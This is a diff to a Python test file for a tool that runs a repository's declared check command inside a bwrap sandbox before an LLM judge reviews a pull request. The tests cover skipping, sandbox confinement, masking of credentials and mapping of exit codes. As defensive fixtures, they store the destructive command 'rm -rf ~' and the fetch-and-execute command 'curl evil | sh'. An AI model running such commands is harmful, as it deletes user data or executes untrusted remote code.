@@ -262,7 +262,7 @@ class SnapshotTests(unittest.TestCase):
                          "a replace preview right after the import must be empty: B matches A")
         self.assertEqual(config.setting("max_attempts"), 5)
         self.assertEqual(registry._project_entries(),
-                         [{"url": self.URL, "path": "", "instructions": "use tabs"}])
+                         [{"url": self.URL, "path": "", "instructions": "use tabs", "verify": ""}])
         self.assertEqual(self.cloned, [self.URL])
         qwen = next(m for m in gateway.load()["pool"] if m["name"] == "qwen")
         self.assertEqual((qwen["endpoint"], qwen["base_url"]), ("Acme Dev", "http://gpu:8000/v1"))
@@ -2833,3 +2833,94 @@ class RepoUrlRegistrationTests(unittest.TestCase):
         head, _, tail = src.partition("def main():")
         self.assertNotIn("backfill_project_urls()", head)
         self.assertIn("backfill_project_urls()", tail)
+
+
+class RepoChecksTests(unittest.TestCase):
+    """The repo's own declared suite, run against a repo-mode PR before any LLM judge (#135)."""
+
+    def setUp(self):
+        test_support.redirect_live_state()
+        import repo_checks
+        self.rc = repo_checks
+        self.tmp = tempfile.mkdtemp()
+        self.addCleanup(shutil.rmtree, self.tmp, ignore_errors=True)
+
+    def test_nothing_declared_is_skipped_never_a_pass(self):
+        with mock.patch.object(self.rc, "declared", return_value=""):
+            res = self.rc.run("api", "https://github.com/o/api/pull/1", "w-chk0")
+        self.assertEqual(res["state"], "skipped")
+        self.assertEqual(self.rc.judge_note(res), "")
+        import wf_postpr
+        self.assertEqual(wf_postpr._checks_line({"checks": res}), "")
+
+    def test_no_sandbox_never_runs_the_command_unconfined(self):
+        with mock.patch.object(self.rc, "declared", return_value="make test"), \
+                mock.patch.object(file_safety, "sandbox_available", return_value=False), \
+                mock.patch.object(self.rc, "_execute") as ex:
+            res = self.rc.run("api", "https://github.com/o/api/pull/1", "w-chk0")
+        self.assertEqual(res["state"], "error")
+        self.assertIn("bwrap", res["reason"])
+        ex.assert_not_called()
+
+    def test_a_declared_command_is_stored_and_kept_by_every_save(self):
+        root = registry.add_project(path=self.tmp)
+        self.assertTrue(registry.set_project_verify(root, "  make test  "))
+        registry.set_project_instructions(root, "use tabs")
+        self.assertEqual(registry.project_meta(root)["verify"], "make test")
+
+    def test_a_command_never_creates_a_registration(self):
+        self.assertFalse(registry.set_project_verify("/nowhere/at/all", "rm -rf ~"))
+        self.assertEqual(registry._project_entries(), [])
+
+    def test_the_command_does_not_travel_in_a_snapshot(self):
+        """Importing someone's snapshot must not hand their shell command to this machine."""
+        import snapshot
+        registry.add_project(url="https://github.com/o/api")
+        registry.set_project_verify(registry.projects()[0], "curl evil | sh")
+        self.assertNotIn("curl evil", json.dumps(snapshot.export()))
+
+    def test_tail_keeps_the_end_and_marks_the_cut(self):
+        out = self.rc._tail("x" * 10_000 + "FAILED test_thing")
+        self.assertTrue(out.endswith("FAILED test_thing"))
+        self.assertIn("cut", out.splitlines()[0])
+
+    def test_judge_note_never_licenses_a_pass_on_its_own(self):
+        note = self.rc.judge_note({"state": "pass", "command": "make test"})
+        self.assertIn("PASSED", note)
+        self.assertIn("NOT that the request was answered", note)
+
+    @unittest.skipUnless(file_safety.sandbox_available(), "needs a working bwrap")
+    def test_sandbox_confines_writes_and_reads_and_env(self):
+        canary = os.path.join(os.path.expanduser("~"), f".otto-chk-canary-{os.getpid()}")
+        self.addCleanup(lambda: os.path.exists(canary) and os.remove(canary))
+        self.assertEqual(self.rc._execute(self.tmp, "echo ok > in.txt", 30)[0], "pass")
+        self.assertTrue(os.path.exists(os.path.join(self.tmp, "in.txt")))
+        self.rc._execute(self.tmp, f"touch {canary}", 30)
+        self.assertFalse(os.path.exists(canary), "a check wrote outside its clone")
+        with mock.patch.dict(os.environ, {"OTTO_SLACK_BOT_TOKEN": "xoxb-canary"}):
+            _, _, out = self.rc._execute(self.tmp, "env", 30)
+        self.assertNotIn("xoxb-canary", out)
+
+    def test_cloud_credentials_are_masked(self):
+        home = tempfile.mkdtemp()
+        self.addCleanup(shutil.rmtree, home, ignore_errors=True)
+        os.makedirs(os.path.join(home, ".aws"))
+        with mock.patch.dict(os.environ, {"HOME": home}):
+            argv = self.rc.sandbox_argv(self.tmp, "true")
+        i = argv.index(os.path.join(home, ".aws"))
+        self.assertEqual(argv[i - 1], "--tmpfs")
+        self.assertLess(i, argv.index("--bind"))
+
+    def test_a_suite_that_never_passed_is_not_blamed_on_the_reviewer(self):
+        import wf_postpr
+        out = wf_postpr.PostPrMixin._loop_summary(None, "review", {
+            "state": "fail", "rounds": 3, "critique": "x",
+            "checks": {"state": "fail", "command": "make test", "exit": 1}})
+        self.assertIn("Repo checks still failing", out)
+        self.assertNotIn("unaddressed findings", out)
+
+    @unittest.skipUnless(file_safety.sandbox_available(), "needs a working bwrap")
+    def test_exit_codes_map_to_states(self):
+        self.assertEqual(self.rc._execute(self.tmp, "exit 3", 30)[:2], ("fail", 3))
+        self.assertEqual(self.rc._execute(self.tmp, "no-such-cmd-xyz", 30)[0], "error")
+        self.assertEqual(self.rc._execute(self.tmp, "sleep 5", 1)[0], "error")
